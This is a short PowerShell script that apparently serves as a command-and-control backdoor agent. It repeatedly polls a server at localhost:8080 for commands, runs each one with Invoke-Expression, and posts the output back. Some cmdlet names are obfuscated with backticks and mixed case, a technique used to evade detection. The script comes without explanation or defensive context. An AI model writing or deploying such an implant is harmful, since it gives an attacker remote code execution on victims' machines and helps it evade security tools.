$session = nEW`-oBj`ECt Microsoft.PowerShell.Commands.WebRequestSession
$sleep_time = 1
function get_command {

    $req = Invoke-WebRequest "http://localhost:8080/getcommand/asd" -Headers @{"Authorization"="1"} 
    return $req.Content 
}

function run_command([string]$command){
    $command  = (iex $command 2>&1 | Out-String )
    return $command
}
function post_response([string]$command){
    

    $postParams = @{rfile=$command}
    $req = Invoke-WebRequest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="1"}  -Body $postParams 
}

$var = 1

while ($var -le 5 -and $var -ne 3)
{
    # $req2 = Invoke-WebRequest "http://localhost:8080/getcommand/asd" -Headers @{"Authorization"="1"} 
    # echo $req2

    $command = get_command
    $command.Trim()
    if($command -eq "exit"){
        exit
    }
    elseif($command.Trim() -eq "none"){
    Start-S`le`ep -s 1
    
    }
    else{

    $command = run_command($command)
    
    post_response($command)

    }
    
    Start-Sleep -s 1
}